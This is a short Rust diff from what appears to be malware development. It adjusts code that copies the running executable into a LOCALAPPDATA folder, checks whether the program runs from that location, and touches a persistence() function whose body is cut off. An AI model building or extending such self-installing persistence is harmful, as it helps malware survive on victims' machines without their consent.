@@ -11,7 +11,7 @@ pub fn get_destination_path() -> (PathBuf, PathBuf) {
     ).join(FOLDER_NAME);
 
     (
-        desired_path.join(format!("{}.exe", FILE_NAME)),
+        desired_path.join(FILE_NAME),
         desired_path,
     )
 }
@@ -20,11 +20,20 @@ pub fn running_from_save_path() -> bool {
     let file_path: PathBuf = PathBuf::from(
         var("LOCALAPPDATA").unwrap()
     ).join(FOLDER_NAME).join(FILE_NAME);
+    
+    let mut current_path = current_exe().unwrap();
 
-    file_path == current_exe().unwrap()
+    println!("{:?}", current_path);
+    println!("{:?}", file_path);
+
+    if let Ok(stripped_path) = current_path.strip_prefix(r"\\?\") {
+        current_path = PathBuf::from(stripped_path);
+    };
+
+    file_path == current_path
 }
 
-pub async fn persistence() -> io::Result<()> {
+pub fn persistence() -> io::Result<()> {
     let current_path = env::current_exe()?;
 
     let (file_path, folder_path) = fs::get_destination_path();
